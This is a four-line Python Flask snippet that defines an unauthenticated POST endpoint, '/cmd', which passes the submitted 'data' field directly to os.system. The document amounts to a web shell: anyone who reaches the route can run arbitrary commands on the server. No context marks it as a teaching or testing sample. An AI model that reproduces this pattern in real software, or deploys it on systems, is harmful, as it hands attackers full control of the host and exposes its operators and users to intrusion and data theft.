@app.route('/cmd', methods=['POST'])
def cmd():
    data = request.form.get('data')
    os.system(data)